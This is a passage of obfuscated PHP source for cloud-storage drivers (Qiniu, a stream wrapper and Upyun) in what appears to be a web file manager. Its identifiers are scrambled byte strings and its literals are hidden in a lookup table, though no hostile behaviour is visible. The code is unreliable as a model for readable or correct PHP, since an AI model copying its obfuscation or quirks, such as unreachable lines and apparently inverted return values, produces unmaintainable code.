empty($this->domain)) { throw new Exception($şëŞÃŞü[1529] . LNG($şëŞÃŞü[1464])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ÎŸºì˜û, $ñ”Íõ = '', $Å¯ŞŠûø = REPEAT_RENAME) { if ($this->setContent($ÎŸºì˜û, $ñ”Íõ)) { return $this->getPathOuter($ÎŸºì˜û); } return !1; } public function mkdir($¾Áòü£ö, $ÂŠÀ¨şì = REPEAT_SKIP) { $ óÁ°î² =& $_SERVER[´È¥ö†ö]; $ÌÕŞªˆÎ = trim($¾Áòü£ö, $ óÁ°î²[8]); if ($this->_isFolder($ÌÕŞªˆÎ)) { return $this->getPathOuter($ÌÕŞªˆÎ); } $¾Áòü£ö = $ÌÕŞªˆÎ . $ óÁ°î²[8]; $¨·¡ç„ = get_path_this($ÌÕŞªˆÎ); $¬ë¡ÙøÜ = $¾Áòü£ö . $¨·¡ç„; if (!$this->mkfile($¬ë¡ÙøÜ)) { return !1; } if (!$this->moveFile($¬ë¡ÙøÜ, $¾Áòü£ö)) { $this->delFile($¬ë¡ÙøÜ); return !1; } return $this->getPathOuter($ÌÕŞªˆÎ); } public function copyFile($×—Î‚û, $‹Úæ„×ß) { $š‘÷»­› = $this->bucketManager->copy($this->bucket, $×—Î‚û, $this->bucket, $‹Úæ„×ß, !0); return $š‘÷»­› ? !1 : $this->getPathOuter($‹Úæ„×ß); } public function moveFile($æ±¹ì¼İ, $ú‡•ß²Õ) { $¡¯¿˜ó± = $this->bucketManager->move($this->bucket, $æ±¹ì¼İ, $this->bucket, $ú‡•ß²Õ, !0); return $¡¯¿˜ó± ? !1 : $this->getPathOuter($ú‡•ß²Õ); } public function delFile($Ö‰éŠ) { if (!$this->exist($Ö‰éŠ)) { return !0; } $¢›˜ïµ = $this->bucketManager->delete($this->bucket, $Ö‰éŠ); if (!$¢›˜ïµ) { return !0; } return $¢›˜ïµ->code() == 612 ? !0 : !1; } public function delFolder($Ÿ”È÷ßš) { $¦¨Ï¤Š‚ =& $_SERVER[´È¥ö†ö]; if (!$this->exist($Ÿ”È÷ßš)) { return !0; } $this->listItemCache = !1; $şûÕˆç» = $this->fileList($Ÿ”È÷ßš); $this->listItemCache = !0; $ışÏª× = trim($Ÿ”È÷ßš, $¦¨Ï¤Š‚[8]) . $¦¨Ï¤Š‚[8]; if (!empty($Ÿ”È÷ßš) && $Ÿ”È÷ßš !== $¦¨Ï¤Š‚[230] && !in_array($ışÏª×, $şûÕˆç»[$¦¨Ï¤Š‚[85]])) { $şûÕˆç»[$¦¨Ï¤Š‚[85]][] = $ışÏª×; } $·ˆ–ñµÍ = $this->delByBatch($şûÕˆç»[$¦¨Ï¤Š‚[86]]); if (!$·ˆ–ñµÍ) { return !1; } $·ˆ–ñµÍ = $this->delByBatch($şûÕˆç»[$¦¨Ï¤Š‚[85]]); if (!$·ˆ–ñµÍ) { return !1; } return $this->delFile($ışÏª×); } private function delByBatch($«’ÇïÛí) { foreach (array_chunk($«’ÇïÛí, 1000) as $¨ŞÑ“) { $««¹ôºå = $this->bucketManager->buildBatchDelete($this->bucket, $¨ŞÑ“); list($êŞÔÍÂ¾, $ìÓùâû–) = $this->bucketManager->batch($««¹ôºå); if ($ìÓùâû–) { return !1; } } return !0; } public function rename($£¥ºÓËÒ, $¬îàÜÆ–) { return $this->renameObject($£¥ºÓËÒ, $¬îàÜÆ–); } public function fileInfo($·»ù³Ì, $¦úŞ = false, $€ã¾îŞÄ = array()) { $¡¥¸…›¢ =& $_SERVER[´È¥ö†ö]; $ì˜œñú‹ = array($¡¥¸…›¢[32] => $this->pathThis($·»ù³Ì), $¡¥¸…›¢[87] => $this->getPathOuter($¡¥¸…›¢[8] . $·»ù³Ì), $¡¥¸…›¢[33] => $¡¥¸…›¢[232], $¡¥¸…›¢[79] => isset($€ã¾îŞÄ[$¡¥¸…›¢[1530]]) ? $€ã¾îŞÄ[$¡¥¸…›¢[1530]] : 0, $¡¥¸…›¢[169] => $this->ext($·»ù³Ì)); if ($¦úŞ) { return $ì˜œñú‹; } $ì˜œñú‹[$¡¥¸…›¢[233]] = $ì˜œñú‹[$¡¥¸…›¢[88]] = 0; $ì˜œñú‹[$¡¥¸…›¢[234]] = $ì˜œñú‹[$¡¥¸…›¢[235]] = !0; if (empty($€ã¾îŞÄ)) { $€ã¾îŞÄ = $this->objectMeta($·»ù³Ì); if (!$€ã¾îŞÄ) { return $ì˜œñú‹; } } if (isset($€ã¾îŞÄ[$¡¥¸…›¢[236]]) && $€ã¾îŞÄ[$¡¥¸…›¢[236]]) { $ì˜œñú‹[$¡¥¸…›¢[237]] = $€ã¾îŞÄ[$¡¥¸…›¢[236]]; } if (isset($€ã¾îŞÄ[$¡¥¸…›¢[247]]) && $€ã¾îŞÄ[$¡¥¸…›¢[247]]) { $ì˜œñú‹[$¡¥¸…›¢[237]] = $€ã¾îŞÄ[$¡¥¸…›¢[247]]; } if (isset($€ã¾îŞÄ[$¡¥¸…›¢[1531]])) { $ì˜œñú‹[$¡¥¸…›¢[88]] = substr($€ã¾îŞÄ[$¡¥¸…›¢[1531]] . $¡¥¸…›¢[12], 0, 10); } if (isset($€ã¾îŞÄ[$¡¥¸…›¢[1530]])) { $ì˜œñú‹[$¡¥¸…›¢[79]] = $€ã¾îŞÄ[$¡¥¸…›¢[1530]]; } return $ì˜œñú‹; } public function folderInfo($ıİè‹ù, $¯ÊÃØ±¾ = false) { $§Û…¯äµ =& $_SERVER[´È¥ö†ö]; $³ÂíâÕ = array($§Û…¯äµ[32] => $this->pathThis($ıİè‹ù), $§Û…¯äµ[87] => $this->getPathOuter($§Û…¯äµ[8] . $ıİè‹ù), $§Û…¯äµ[33] => $§Û…¯äµ[78]); if ($¯ÊÃØ±¾) { return $³ÂíâÕ; } $³ÂíâÕ[$§Û…¯äµ[233]] = $³ÂíâÕ[$§Û…¯äµ[88]] = 0; $³ÂíâÕ[$§Û…¯äµ[234]] = $³ÂíâÕ[$§Û…¯äµ[235]] = !0; $ıİè‹ù = rtrim($ıİè‹ù, $§Û…¯äµ[8]) . $§Û…¯äµ[8]; $ã¢¨ò¨û = $this->objectMeta($ıİè‹ù); if (isset($ã¢¨ò¨û[$§Û…¯äµ[1531]])) { $³ÂíâÕ[$§Û…¯äµ[88]] = substr($ã¢¨ò¨û[$§Û…¯äµ[1531]] . $§Û…¯äµ[12], 0, 10); } return $³ÂíâÕ; } public function listPath($ ƒğÅó, $âÓ’­¶× = false) { $Ó‚ü‚¡’ =& $_SERVER[´È¥ö†ö]; $şĞñòñ = $this->fileList($ ƒğÅó, $Ó‚ü‚¡’[8], !0); foreach ($şĞñòñ[$Ó‚ü‚¡’[85]] as $Œ¼ŠĞÇû => $î×ÅÚ¡ë) { $şĞñòñ[$Ó‚ü‚¡’[85]][$Œ¼ŠĞÇû] = $this->folderInfo($î×ÅÚ¡ë, $âÓ’­¶×); } foreach ($şĞñòñ[$Ó‚ü‚¡’[86]] as $Œ¼ŠĞÇû => $î×ÅÚ¡ë) { $şĞñòñ[$Ó‚ü‚¡’[86]][$Œ¼ŠĞÇû] = $this->fileInfo($î×ÅÚ¡ë[$Ó‚ü‚¡’[97]], $âÓ’­¶×, $î×ÅÚ¡ë); } return $şĞñòñ; } public function has($ô¥¤ÇÅß, $®÷åÂÄ = false, $ûúø  = true) { $íá€ñêÛ =& $_SERVER[´È¥ö†ö]; $ô¥¤ÇÅß = trim($ô¥¤ÇÅß, $íá€ñêÛ[8]); $§şÑƒ¼ = empty($ô¥¤ÇÅß) && $ô¥¤ÇÅß !== $íá€ñêÛ[230] ? $íá€ñêÛ[12] : $ô¥¤ÇÅß . $íá€ñêÛ[8]; $•ºşöË½ = $íá€ñêÛ[12]; $¿½§ìª¥ = 500; $«Û„Şü® = $íá€ñêÛ[8]; $Ğ‰‘ë¼ = $ìŒğÉúÃ = 0; while (!0) { check_abort(); list($ê®¸ÍŞ, $ò­’‡»Ã) = $this->bucketManager->listFiles($this->bucket, $§şÑƒ¼, $•ºşöË½, $¿½§ìª¥, $«Û„Şü®); if ($ò­’‡»Ã) { break; } $•ºşöË½ = array_key_exists($íá€ñêÛ[1476], $ê®¸ÍŞ) ? $•ºşöË½ = $ê®¸ÍŞ[$íá€ñêÛ[1532]] : $íá€ñêÛ[12]; if ($®÷åÂÄ) { if (!empty($ê®¸ÍŞ[$íá€ñêÛ[1533]])) { $Ğ‰‘ë¼ += count($ê®¸ÍŞ[$íá€ñêÛ[1533]]); } if (!empty($ê®¸ÍŞ[$íá€ñêÛ[1534]])) { $ìŒğÉúÃ += count($ê®¸ÍŞ[$íá€ñêÛ[1534]]); } if ($•ºşöË½ === $íá€ñêÛ[12]) { break; } continue; } if ($ûúø ) { if (!empty($ê®¸ÍŞ[$íá€ñêÛ[1533]])) { return !0; } } else { if (!empty($ê®¸ÍŞ[$íá€ñêÛ[1534]])) { return !0; } } if ($•ºşöË½ === $íá€ñêÛ[12]) { break; } } if ($®÷åÂÄ) { return array($íá€ñêÛ[241] => $Ğ‰‘ë¼, $íá€ñêÛ[242] => $ìŒğÉúÃ); } return !1; } public function listAll($¡Â¿¾åÜ) { $ıË”ñë‡ =& $_SERVER[´È¥ö†ö]; $¸Ó”İƒ = $this->fileList($¡Â¿¾åÜ, $ıË”ñë‡[12], !0); $¬¼Şøù = array_to_keyvalue($¸Ó”İƒ[$ıË”ñë‡[86]], $ıË”ñë‡[32]); foreach ($¸Ó”İƒ[$ıË”ñë‡[85]] as $Å¨ï¶Ø«) { if (is_string($Å¨ï¶Ø«)) { $¬¼Şøù[$Å¨ï¶Ø«] = array($ıË”ñë‡[79] => 0); } } return $this->listAllFiles($¡Â¿¾åÜ, $¬¼Şøù); } private function fileList($Üñƒ•“¢, $—®£Ç = '', $è¨„ó° = 0) { $˜Ğ•Ïš¬ =& $_SERVER[´È¥ö†ö]; $Üñƒ•“¢ = trim($Üñƒ•“¢, $˜Ğ•Ïš¬[8]); $ãËÔµ»ı = empty($Üñƒ•“¢) && $Üñƒ•“¢ !== $˜Ğ•Ïš¬[230] ? $˜Ğ•Ïš¬[12] : $Üñƒ•“¢ . $˜Ğ•Ïš¬[8]; $ŒûÆÖªµ = $˜Ğ•Ïš¬[12]; $³àÙµº = 1000; $‚ÕÉ¾‡ = $Ò•Ù–É = array(); while (!0) { check_abort(); list($Ó£ÊĞ¶õ, $×øñ¶¾‹) = $this->bucketManager->listFiles($this->bucket, $ãËÔµ»ı, $ŒûÆÖªµ, $³àÙµº, $—®£Ç); if ($×øñ¶¾‹) { break; } $ŒûÆÖªµ = array_key_exists($˜Ğ•Ïš¬[1476], $Ó£ÊĞ¶õ) ? $ŒûÆÖªµ = $Ó£ÊĞ¶õ[$˜Ğ•Ïš¬[1532]] : $˜Ğ•Ïš¬[12]; $ÓÃëÃ‰ò = isset($Ó£ÊĞ¶õ[$˜Ğ•Ïš¬[1533]]) ? $Ó£ÊĞ¶õ[$˜Ğ•Ïš¬[1533]] : array(); $ÏÙ¯ğ° = isset($Ó£ÊĞ¶õ[$˜Ğ•Ïš¬[1534]]) ? $Ó£ÊĞ¶õ[$˜Ğ•Ïš¬[1534]] : array(); foreach ($ÓÃëÃ‰ò as $¡íÉ¯„‘) { if ($¡íÉ¯„‘[$˜Ğ•Ïš¬[97]] == $ãËÔµ»ı) { continue; } $…»ØÊé÷ = $¡íÉ¯„‘[$˜Ğ•Ïš¬[97]]; $ä³à ®Š = $¡íÉ¯„‘[$˜Ğ•Ïš¬[1530]]; $¡íÉ¯„‘[$˜Ğ•Ïš¬[79]] = $ä³à ®Š; $Åø¾ç½ = $ä³à ®Š == 0 && substr($…»ØÊé÷, strlen($…»ØÊé÷) - 1, 1) == $˜Ğ•Ïš¬[8] ? !0 : !1; $this->cacheMethodInfoSet($…»ØÊé÷, $Åø¾ç½, $¡íÉ¯„‘); if ($Åø¾ç½) { $‚ÕÉ¾‡[] = $…»ØÊé÷; continue; } $Ò•Ù–É[] = $è¨„ó° ? $¡íÉ¯„‘ : $…»ØÊé÷; } foreach ($ÏÙ¯ğ° as $…»ØÊé÷) { if ($…»ØÊé÷ == $ãËÔµ»ı) { continue; } $‚ÕÉ¾‡[] = $…»ØÊé÷; $this->cacheMethodInfoSet($…»ØÊé÷, !0); } if ($ŒûÆÖªµ === $˜Ğ•Ïš¬[12]) { break; } } $this->cacheMethodInfoSet($Üñƒ•“¢, !0); return array($˜Ğ•Ïš¬[85] => $‚ÕÉ¾‡, $˜Ğ•Ïš¬[86] => $Ò•Ù–É); } public function canRead($İ®äî½) { return $this->exist($İ®äî½) ? !0 : !1; } public function canWrite($¤€Ö¡Î¼) { return $this->exist($¤€Ö¡Î¼) ? !0 : !1; } public function getContent($ÔŠ¨èİ) { return $this->fileSubstr($ÔŠ¨èİ, 0, -1); } public function setContent($™æÙ²äÎ, $Îş‹»”ø = '') { $®Û«£ô = $this->tempFile($this->pathThis($™æÙ²äÎ)); file_put_contents($®Û«£ô, $Îş‹»”ø); if ($this->upload($™æÙ²äÎ, $®Û«£ô)) { $this->tempFileRemve($®Û«£ô); return !0; } return !1; } public function refreshUrls($”İïÇ‚) { $¡³Ë¡‚¡ =& $_SERVER[´È¥ö†ö]; $­ÈÎ¬Ê = array(); if (is_array($”İïÇ‚)) { foreach ($”İïÇ‚ as $ÕÊƒˆ) { $­ÈÎ¬Ê[] = $this->link($ÕÊƒˆ); } } else { $­ÈÎ¬Ê[] = $this->link($”İïÇ‚); } $½Ú°©›½ = new Qiniu\Cdn\CdnManager($this->auth); list($£ÇÍÜ, $ì§Ã×¦¢) = $½Ú°©›½->refreshUrls($­ÈÎ¬Ê); if ($ì§Ã×¦¢) { return !1; } return $£ÇÍÜ[$¡³Ë¡‚¡[1263]] == $¡³Ë¡‚¡[835] ? !0 : !1; } public function fileSubstr($şú”éï¸, $²ĞêÕŞ˜, $¶úÚ«ñ¬) { $Ÿˆœïøä =& $_SERVER[´È¥ö†ö]; if (!($øûã«Ğ— = $this->link($şú”éï¸))) { return !1; } $’ÔŞ©¿Ã = !1; if ($¶úÚ«ñ¬ > 0) { $ãÙ–µ£ì = $²ĞêÕŞ˜ + $¶úÚ«ñ¬ - 1; $’ÔŞ©¿Ã = array($Ÿˆœïøä[1535] . $²ĞêÕŞ˜ . $Ÿˆœïøä[473] . $ãÙ–µ£ì); } $ì¿­Ôè = url_request($øûã«Ğ—, $Ÿˆœïøä[1495], !1, $’ÔŞ©¿Ã); return $ì¿­Ôè[$Ÿˆœïøä[826]] ? $ì¿­Ôè[$Ÿˆœïøä[1286]] : !1; } public function upload($©æ¬–²Ñ, $ü¤ø‚è‡, $óä¬˜Ë  = false, $İ–¶Ÿœ = REPEAT_REPLACE) { $êÅ Û‹ä = new Qiniu\Storage\UploadManager(); $‘Ã¬×´ = $this->auth->uploadToken($this->bucket, $©æ¬–²Ñ); $¨é¹Ş¿Ø = get_file_mime(get_path_ext($ü¤ø‚è‡)); list($±²äËù, $¦âÀÏˆŞ) = $êÅ Û‹ä->putFile($‘Ã¬×´, $©æ¬–²Ñ, $ü¤ø‚è‡, null, $¨é¹Ş¿Ø); return $¦âÀÏˆŞ ? !1 : $this->getPathOuter($©æ¬–²Ñ); } public function uploadFormData($©ÏÓóš, $òÓöô›Å = 3600) { return $this->uploadToken($©ÏÓóš, $òÓöô›Å); } public function uploadMultiData($”éŞ×Ø, $´œ¢…®î = 3600) { return $this->uploadToken($”éŞ×Ø, $´œ¢…®î); } private function uploadToken($â¥Ë‰è, $Ü§Ğ”ä = 3600) { $­ùî ¦¥ =& $_SERVER[´È¥ö†ö]; $‘“òĞİÀ = $Ü§Ğ”ä; $×úİ¸Öê = array($­ùî ¦¥[1536] => $­ùî ¦¥[1537]); $¨ØĞ©ªç = $â¥Ë‰è; $Ê‚¨âŠî = $this->auth->uploadToken($this->bucket, $¨ØĞ©ªç, $‘“òĞİÀ, $×úİ¸Öê, !0); $ĞÒú‡¼­ = empty($this->region) || $this->region == $­ùî ¦¥[1538] ? $­ùî ¦¥[12] : $­ùî ¦¥[473] . $this->region; $İÓà¤ = http_type() . "\x3a\57\57\165\x70\154\157\x61\x64{$ĞÒú‡¼­}\x2e\x71\x69\156\x69\x75\x70\x2e\x63\157\x6d\57"; return array($­ùî ¦¥[1539] => $Ê‚¨âŠî, $­ùî ¦¥[1540] => $İÓà¤); } public function download($Š—‹¬‚, $¦İÉÛ¹Š) { $õµŸ¦­… = IO::getPathInner(IO::mkfile($¦İÉÛ¹Š)); if (!($òÖ¿éÅÍ = $this->link($Š—‹¬‚))) { return !1; } $ïä×Ø•ô = 0; $…ÃÔØ = 1024 * 200; $Çîá”–Ô = fopen($õµŸ¦­…, $_SERVER[´È¥ö†ö][1541]); while (!0) { $©¢å±àƒ = $this->fileSubstr($Š—‹¬‚, $ïä×Ø•ô, $…ÃÔØ); if ($©¢å±àƒ === !1) { return !1; } fwrite($Çîá”–Ô, $©¢å±àƒ); $ïä×Ø•ô += $…ÃÔØ; if (strlen($©¢å±àƒ) < $…ÃÔØ) { break; } } fclose($Çîá”–Ô); return $¦İÉÛ¹Š; } public function link($ ÜãşÉ„, $É÷¦ı®½ = '') { if (!$this->isFile($ ÜãşÉ„)) { return !1; } $£ºåì = $this->getHost() . $_SERVER[´È¥ö†ö][8] . $this->pathEncode($ ÜãşÉ„) . $É÷¦ı®½; return $this->auth->privateDownloadUrl($£ºåì, 3600 * 12); } public function fileOut($¶œÒÅˆ†, $§ñİõä× = false, $¾ÇìÄÄï = false, $ÇªúÁÃÏ = '') { $ëœ‰ïù =& $_SERVER[´È¥ö†ö]; if ($this->isFileOutServer()) { return $this->fileOutServer($¶œÒÅˆ†, $§ñİõä×, $¾ÇìÄÄï, $ÇªúÁÃÏ); } if (!$¾ÇìÄÄï) { $¾ÇìÄÄï = $this->pathThis($¶œÒÅˆ†); } $¬§óõ¸í = $§ñİõä× ? $ëœ‰ïù[1542] . rawurlencode($¾ÇìÄÄï) : $ëœ‰ïù[12]; $½Øíõß = $this->link($¶œÒÅˆ†, $¬§óõ¸í); $this->fileOutLink($½Øíõß); } public function fileOutServer($›Ó¡œ×Â, $æüíèÒ = false, $½Êè¡ÆŒ = false, $œÊŸˆ‚Ó = '') { parent::fileOut($›Ó¡œ×Â, $æüíèÒ, $½Êè¡ÆŒ, $œÊŸˆ‚Ó); } public function fileOutImage($À³Ğ³ªù, $ê‰ª§É = 250) { if ($this->size($À³Ğ³ªù) > 1024 * 1024 * 20) { return $this->fileOutImageServer($À³Ğ³ªù, $ê‰ª§É); } $¢£ä–ó½ = $this->link($À³Ğ³ªù, $_SERVER[´È¥ö†ö][1543] . $ê‰ª§É); $this->fileOutLink($¢£ä–ó½); } public function fileOutImageServer($Ó€­½â¦, $œı¸Ïó = 250) { parent::fileOutImage($Ó€­½â¦, $œı¸Ïó); } public function hashMd5($–ÛÂé€ñ) { $ĞÍê“•ñ =& $_SERVER[´È¥ö†ö]; $ÄÁÇå¼ = $this->objectMeta($–ÛÂé€ñ); return isset($ÄÁÇå¼[$ĞÍê“•ñ[247]]) ? $ÄÁÇå¼[$ĞÍê“•ñ[247]] : !1; $’ÈŞ——ó = $this->link($–ÛÂé€ñ, $ĞÍê“•ñ[1544]); } public function size($³èÒ”í ) { $üşï»’û = $this->objectMeta($³èÒ”í ); return $üşï»’û ? $üşï»’û[$_SERVER[´È¥ö†ö][79]] : 0; } public function info($¬†³ªÎË) { if ($this->isFolder($¬†³ªÎË)) { return $this->folderInfo($¬†³ªÎË); } else { if ($this->isFile($¬†³ªÎË)) { return $this->fileInfo($¬†³ªÎË); } } return !1; } public function exist($©ô¦ıÜÕ) { return $this->isFile($©ô¦ıÜÕ) || $this->isFolder($©ô¦ıÜÕ); } public function isFile($ËìÄÁ÷®) { return !$this->isFolder($ËìÄÁ÷®) && $this->objectMeta($ËìÄÁ÷®); } public function isFolder($Ú¦Ì£ß£) { return $this->cacheMethod($_SERVER[´È¥ö†ö][179], $Ú¦Ì£ß£); } protected function objectMeta($¶›¬°¿š) { return $this->cacheMethod($_SERVER[´È¥ö†ö][181], $¶›¬°¿š); } protected function _objectMeta($‰ˆ¸ú€İ) { $£ç·Ìœ =& $_SERVER[´È¥ö†ö]; list($±ØÆ¹¢È, $ê“¢É—Ö) = $this->bucketManager->stat($this->bucket, $‰ˆ¸ú€İ); if ($±ØÆ¹¢È) { $±ØÆ¹¢È[$£ç·Ìœ[79]] = intval($±ØÆ¹¢È[$£ç·Ìœ[1530]]); } return $±ØÆ¹¢È; } protected function _isFolder($÷“Í°É’) { $—é¼ª÷µ =& $_SERVER[´È¥ö†ö]; if ($÷“Í°É’ == $—é¼ª÷µ[12] || $÷“Í°É’ == $—é¼ª÷µ[8]) { return !0; } list($÷¼ğ€˜·, $‡©¸ä§×) = $this->bucketManager->listFiles($this->bucket, trim($÷“Í°É’, $—é¼ª÷µ[8]) . $—é¼ª÷µ[8], $—é¼ª÷µ[12], 1, $—é¼ª÷µ[8]); return !empty($÷¼ğ€˜·[$—é¼ª÷µ[1533]]) || !empty($÷¼ğ€˜·[$—é¼ª÷µ[1534]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($„½òˆØÕ, $”Ú¬Ùº÷ = 0) { parent::__construct(); $this->source = $„½òˆØÕ; $this->sourceSize = $”Ú¬Ùº÷; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Öœ¯§‘û = false) { return $this->sourceSize; } public function getContent($ß˜ÂÙƒØ = false) { return $this->fileSubstr($ß˜ÂÙƒØ, 0, $this->sourceSize); } public function fileSubstr($º¾™Šùı = false, $Øİñ‘¶¿ = 0, $»§İáÍ = 0) { if (!$»§İáÍ) { $»§İáÍ = $this->sourceSize; } $ÊÊ›‹•Ü = $this->sourceSize - $Øİñ‘¶¿; if ($»§İáÍ >= $ÊÊ›‹•Ü) { $»§İáÍ = $ÊÊ›‹•Ü; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Øİñ‘¶¿, $»§İáÍ); } if ($this->sourceType == self::TYPE_FILE) { if ($»§İáÍ <= 0) { return $_SERVER[´È¥ö†ö][12]; } $íÍÂ‹ëş = ftell($this->source); fseek_64($this->source, $íÍÂ‹ëş + $Øİñ‘¶¿); $½ª‰ÔÏ‹ = @fread($this->source, $»§İáÍ); fseek_64($this->source, $íÍÂ‹ëş); return $½ª‰ÔÏ‹; } } public function hashMd5($¢”öæÇº = false) { return md5($this->getContent()); } public static function hash($ˆ¬ÅÔ«¢, $ÇçÓ»×¶ = 0) { $”ÁñÒ = new PathDriverStream($ˆ¬ÅÔ«¢, $ÇçÓ»×¶); return $”ÁñÒ->hashSimple($ˆ¬ÅÔ«¢); } public static function md5($“Ö–Œ, $ææí–÷× = 0) { $¢™ìÍ’€ = new PathDriverStream($“Ö–Œ, $ææí–÷×); return $¢™ìÍ’€->hashMd5($“Ö–Œ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\x70\x3a\x2f\57\166\60\x2e\x61\160\x69\56\165\x70\171\x75\x6e\x2e\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($àæ†õÛÃ) { parent::__construct(); $this->_init($àæ†õÛÃ); } public function _init($˜ÛŒçØè) { $§éé°æ± =& $_SERVER[´È¥ö†ö]; foreach ($˜ÛŒçØè as $ìšùñ => $øÁ§’íÈ) { if (isset($this->{$ìšùñ})) { $this->{$ìšùñ} = $øÁ§’íÈ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($§éé°æ±[1545] . LNG($§éé°æ±[1464])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ÕÆ§¶Ú¨, $´¤ÂÎÒ„ = "\x47\105\124") { $ğ„û›ƒ… =& $_SERVER[´È¥ö†ö]; $ÂÛæô¨… = gmdate($ğ„û›ƒ…[1493]); $óŒ­øÇÑ = base64_encode(hash_hmac($ğ„û›ƒ…[1546], "{$´¤ÂÎÒ„}\46{$ÕÆ§¶Ú¨}\x26{$ÂÛæô¨…}", md5("{$this->userpass}"), !0)); $ïÌ¾áúï = array("\x41\x75\164\150\x6f\162\151\172\141\x74\x69\157\156\72\125\x50\131\x55\x4e\40{$this->username}\72{$óŒ­øÇÑ}", "\x44\141\x74\x65\72{$ÂÛæô¨…}"); return $ïÌ¾áúï; } public function ussRequest($ëüĞ¶ıº, $·êÖÕÆ› = "\107\x45\124", $ùªŞòÎê = false, $“İ¶æ­ = false, $ä‹È™Æß = false) { $ô¼¾—ÕŒ =& $_SERVER[´È¥ö†ö]; $ëüĞ¶ıº = trim($ëüĞ¶ıº, $ô¼¾—ÕŒ[8]); $¦†Áˆ¬” = "\x2f{$this->bucket}\x2f" . rawurlencode($ëüĞ¶ıº); $şÚä¼á = $this->ussHeaders($¦†Áˆ¬”, $·êÖÕÆ›); if ($“İ¶æ­) { $şÚä¼á = array_merge($şÚä¼á, $“İ¶æ­); } $™‹’ûº§ = url_request($this->endpoint . $¦†Áˆ¬”, $·êÖÕÆ›, $ùªŞòÎê, $şÚä¼á, $ä‹È™Æß); if (!$™‹’ûº§) { $ßï­ëŞà = LNG($ô¼¾—ÕŒ[1547]); $this->writeLog($ßï­ëŞà); return array($ô¼¾—ÕŒ[1296] => !1, $ô¼¾—ÕŒ[1286] => $ßï­ëŞà); } if (strtolower($·êÖÕÆ›) == $ô¼¾—ÕŒ[229] || in_array($™‹’ûº§[$ô¼¾—ÕŒ[1296]], array($ô¼¾—ÕŒ[263], $ô¼¾—ÕŒ[1548]))) { $ùªŞòÎê = $™‹’ûº§[$ô¼¾—ÕŒ[1549]]; if (!$™‹’ûº§[$ô¼¾—ÕŒ[826]]) { $ùªŞòÎê = isset($ùªŞòÎê[0]) ? $ùªŞòÎê[0] : $ô¼¾—ÕŒ[12]; } } else { $ùªŞòÎê = json_decode($™‹’ûº§[$ô¼¾—ÕŒ[1286]], !0); if (!$ùªŞòÎê) { $ùªŞòÎê = $™‹’ûº§[$ô¼¾—ÕŒ[1286]]; } else { if (!$™‹’ûº§[$ô¼¾—ÕŒ[826]] && isset($ùªŞòÎê[$ô¼¾—ÕŒ[1550]])) { $ùªŞòÎê = $ùªŞòÎê[$ô¼¾—ÕŒ[1550]]; } } } if (!$™‹’ûº§[$ô¼¾—ÕŒ[826]]) { $this->writeLog($this->__errorMessage($ùªŞòÎê)); } return array($ô¼¾—ÕŒ[1296] => $™‹’ûº§[$ô¼¾—ÕŒ[826]], $ô¼¾—ÕŒ[1286] => $ùªŞòÎê); } private function __errorMessage($Å«İçĞ) { $¸½­ãÂ¨ =& $_SERVER[´È¥ö†ö]; if (!$Å«İçĞ) { return $¸½­ãÂ¨[12]; } static $´Á°øÎ = null; if (!$´Á°øÎ) { $´Á°øÎ = I18n::getType(); } if ($´Á°øÎ != $¸½­ãÂ¨[1503]) { return $Å«İçĞ; } $À”›ÏÇ = array($¸½­ãÂ¨[1551] => $¸½­ãÂ¨[1552], $¸½­ãÂ¨[1553] => $¸½­ãÂ¨[1554], $¸½­ãÂ¨[1555] => $¸½­ãÂ¨[1554], $¸½­ãÂ¨[1556] => $¸½­ãÂ¨[1557], $¸½­ãÂ¨[1558] => $¸½­ãÂ¨[1559], $¸½­ãÂ¨[1560] => $¸½­ãÂ¨[1561], $¸½­ãÂ¨[1562] => $¸½­ãÂ¨[1563]); return isset($À”›ÏÇ[$Å«İçĞ]) ? $À”›ÏÇ[$Å«İçĞ] : $Å«İçĞ; } public function mkfile($‰èíıŒó, $¨ó‘ø— = '', $ßÆêš¡× = REPEAT_RENAME) { if ($this->setContent($‰èíıŒó, $¨ó‘ø—)) { return $this->getPathOuter($‰èíıŒó); } return !1; } public function mkdir($ğ‰¼û, $“æçĞ± = REPEAT_SKIP) { $¨İæ¨úÔ =& $_SERVER[´È¥ö†ö]; $Äô—å = trim($ğ‰¼û, $¨İæ¨úÔ[8]); if ($this->_isFolder($Äô—å)) { return $this->getPathOuter($Äô—å); } $­Ò«ˆÃŞ = array($¨İæ¨úÔ[1564]); $•…¢‘ëŒ = $this->ussRequest($Äô—å, $¨İæ¨úÔ[290], !1, $­Ò«ˆÃŞ); return $•…¢‘ëŒ[$¨İæ¨úÔ[1296]] ? $this->getPathOuter($Äô—å) : !1; } public function copyFile($Ü‚±°åÏ, $Í—ÌŒ±) { $¼ˆˆıÎ€ =& $_SERVER[´È¥ö†ö]; $…ÆÃáµü = array($¼ˆˆıÎ€[1565] . "\x2f{$this->bucket}\57{$Ü‚±°åÏ}", $¼ˆˆıÎ€[1566]); $°´ùÇ¾ = $this->ussRequest($Í—ÌŒ±, $¼ˆˆıÎ€[255], !1, $…ÆÃáµü); return $°´ùÇ¾[$¼ˆˆıÎ€[1296]] ? !0 : $this->getPathOuter($Í—ÌŒ±); } public function moveFile($€æ­‘êÈ, $ñ«¿àóà) { $ô£ø•¨¼ =& $_SERVER[´È¥ö†ö]; $»õãöô¾ = array($ô£ø•¨¼[1567] . "\57{$this->bucket}\57{$€æ­‘êÈ}", $ô£ø•¨¼[1566]); $­ÁçĞ¯‘ = $this->ussRequest($ñ«¿àóà, $ô£ø•¨¼[255], !1, $»õãöô¾); return 